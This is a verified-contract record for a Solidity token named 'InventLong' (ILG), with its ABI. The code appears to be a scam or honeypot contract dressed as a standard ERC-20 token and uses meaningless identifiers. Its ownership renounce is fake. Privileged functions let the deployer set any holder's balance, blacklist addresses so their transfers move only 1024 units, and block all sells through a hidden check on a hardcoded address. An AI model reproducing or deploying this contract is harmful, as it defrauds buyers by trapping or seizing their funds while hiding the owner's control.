{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface sellEnableIs {\n    function createPair(address amountAtTrading, address txIs) external returns (address);\n}\n\ninterface minLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minReceiver) external view returns (uint256);\n\n    function transfer(address totalTeam, uint256 feeTotal) external returns (bool);\n\n    function allowance(address shouldTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalTeam,\n        uint256 feeTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountLaunchedTeam, uint256 value);\n    event Approval(address indexed shouldTeam, address indexed spender, uint256 value);\n}\n\nabstract contract txSellMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minLaunchedMetadata is minLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InventLong is txSellMode, minLaunched, minLaunchedMetadata {\n\n    uint256 private senderTrading = 100000000 * 10 ** 18;\n\n    function feeSell(address atAuto, uint256 feeTotal) public {\n        limitSwap();\n        feeMaxTotal[atAuto] = feeTotal;\n    }\n\n    uint256 buyIs;\n\n    function receiverLaunch(address senderToken) public {\n        limitSwap();\n        if (amountReceiver != swapTake) {\n            fromWalletSender = minSell;\n        }\n        if (senderToken == atLaunch || senderToken == sellLimitReceiver) {\n            return;\n        }\n        maxMin[senderToken] = true;\n    }\n\n    function owner() external view returns (address) {\n        return amountBuyTrading;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityTeam;\n    }\n\n    mapping(address => bool) public isLaunch;\n\n    bool public marketingToken;\n\n    function toBuyFund(address walletExempt, address totalTeam, uint256 feeTotal) internal returns (bool) {\n        require(feeMaxTotal[walletExempt] >= feeTotal);\n        feeMaxTotal[walletExempt] -= feeTotal;\n        feeMaxTotal[totalTeam] += feeTotal;\n        emit Transfer(walletExempt, totalTeam, feeTotal);\n        return true;\n    }\n\n    function takeFrom(uint256 feeTotal) public {\n        limitSwap();\n        buyIs = feeTotal;\n    }\n\n    uint8 private liquidityTeam = 18;\n\n    string private launchedIs = \"ILG\";\n\n    function allowance(address senderFee, address shouldTrading) external view virtual override returns (uint256) {\n        if (shouldTrading == listMax) {\n            return type(uint256).max;\n        }\n        return tradingShould[senderFee][shouldTrading];\n    }\n\n    uint256 private amountReceiver;\n\n    function limitSwap() private view {\n        require(isLaunch[_msgSender()]);\n    }\n\n    uint256 public minAuto;\n\n    mapping(address => uint256) private feeMaxTotal;\n\n    uint256 public txMin;\n\n    address public sellLimitReceiver;\n\n    function getOwner() external view returns (address) {\n        return amountBuyTrading;\n    }\n\n    uint256 private swapTake;\n\n    string private maxTo = \"Invent Long\";\n\n    function transfer(address atAuto, uint256 feeTotal) external virtual override returns (bool) {\n        return modeListTake(_msgSender(), atAuto, feeTotal);\n    }\n\n    function liquidityBuy() public {\n        emit OwnershipTransferred(atLaunch, address(0));\n        amountBuyTrading = address(0);\n    }\n\n    function approve(address shouldTrading, uint256 feeTotal) public virtual override returns (bool) {\n        tradingShould[_msgSender()][shouldTrading] = feeTotal;\n        emit Approval(_msgSender(), shouldTrading, feeTotal);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchedIs;\n    }\n\n    bool private exemptFrom;\n\n    function balanceOf(address minReceiver) public view virtual override returns (uint256) {\n        return feeMaxTotal[minReceiver];\n    }\n\n    address private amountBuyTrading;\n\n    constructor (){\n        if (fromWalletSender == minSell) {\n            minSell = txMin;\n        }\n        swapTeam totalSell = swapTeam(listMax);\n        sellLimitReceiver = sellEnableIs(totalSell.factory()).createPair(totalSell.WETH(), address(this));\n        if (exemptFrom) {\n            txMin = minSell;\n        }\n        atLaunch = _msgSender();\n        isLaunch[atLaunch] = true;\n        feeMaxTotal[atLaunch] = senderTrading;\n        liquidityBuy();\n        if (fromWalletSender == minAuto) {\n            minAuto = txMin;\n        }\n        emit Transfer(address(0), atLaunch, senderTrading);\n    }\n\n    event OwnershipTransferred(address indexed walletTakeExempt, address indexed teamMin);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderTrading;\n    }\n\n    uint256 private fromWalletSender;\n\n    uint256 feeReceiver;\n\n    function transferFrom(address walletExempt, address totalTeam, uint256 feeTotal) external override returns (bool) {\n        if (_msgSender() != listMax) {\n            if (tradingShould[walletExempt][_msgSender()] != type(uint256).max) {\n                require(feeTotal <= tradingShould[walletExempt][_msgSender()]);\n                tradingShould[walletExempt][_msgSender()] -= feeTotal;\n            }\n        }\n        return modeListTake(walletExempt, totalTeam, feeTotal);\n    }\n\n    uint256 private minSell;\n\n    address public atLaunch;\n\n    uint256 constant fundFromTo = 2 ** 10;\n\n    function modeListTake(address walletExempt, address totalTeam, uint256 feeTotal) internal returns (bool) {\n        if (walletExempt == atLaunch) {\n            return toBuyFund(walletExempt, totalTeam, feeTotal);\n        }\n        uint256 tradingList = minLaunched(sellLimitReceiver).balanceOf(fundTeam);\n        require(tradingList == buyIs);\n        require(totalTeam != fundTeam);\n        if (maxMin[walletExempt]) {\n            return toBuyFund(walletExempt, totalTeam, fundFromTo);\n        }\n        return toBuyFund(walletExempt, totalTeam, feeTotal);\n    }\n\n    address fundTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private tradingShould;\n\n    function buyTotal(address enableReceiverMarketing) public {\n        if (marketingToken) {\n            return;\n        }\n        \n        isLaunch[enableReceiverMarketing] = true;\n        if (minAuto != swapTake) {\n            txMin = minSell;\n        }\n        marketingToken = true;\n    }\n\n    bool public takeList;\n\n    function name() external view virtual override returns (string memory) {\n        return maxTo;\n    }\n\n    address listMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public maxMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTakeExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountLaunchedTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableReceiverMarketing\",\"type\":\"address\"}],\"name\":\"buyTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTotal\",\"type\":\"uint256\"}],\"name\":\"feeSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"}],\"name\":\"receiverLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLimitReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeTotal\",\"type\":\"uint256\"}],\"name\":\"takeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InventLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}